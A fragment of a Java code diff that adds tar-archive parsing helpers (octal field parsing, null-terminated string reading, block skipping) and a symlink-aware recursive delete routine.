+        byte[] skipBuf = new byte[4096];
+        long left = count;
+        while (left > 0) {
+            int n = in.read(skipBuf, 0, (int) Math.min(skipBuf.length, left));
+            if (n < 0) break;
+            left -= n;
+        }
+    }
+
+    private static boolean isAllZeroBlock(byte[] block) {
+        for (int i = 0; i < block.length; i++) {
+            if (block[i] != 0) return false;
+        }
+        return true;
+    }
+
+    private static String readTarString(byte[] buf, int off, int len) {
+        int end = off;
+        int limit = off + len;
+        while (end < limit && buf[end] != 0) end++;
+        return new String(buf, off, end - off, StandardCharsets.UTF_8).trim();
+    }
+
+    private static String trimNulls(String s) {
+        int idx = s.indexOf('\0');
+        return idx >= 0 ? s.substring(0, idx) : s;
+    }
+
+    private static long parseTarOctal(byte[] buf, int off, int len) {
+        long val = 0L;
+        int end = off + len;
+        int i = off;
+        while (i < end && (buf[i] == 0 || buf[i] == ' ')) i++;
+        while (i < end && buf[i] >= '0' && buf[i] <= '7') {
+            val = (val << 3) + (buf[i] - '0');
+            i++;
+        }
+        return val;
+    }
+
+    private static void deletePathRecursively(File file) {
+        if (file == null || !file.exists()) return;
+        if (!Files.isSymbolicLink(file.toPath())) {
+            File[] children = file.listFiles();
+            if (children != null) {
+                for (int i = 0; i < children.length; i++) {
+                    deletePathRecursively(children[i]);
+                }
+            }
+        }
+        file.delete();
     }
 
     private static List<String> getStartupVersionMessages() {
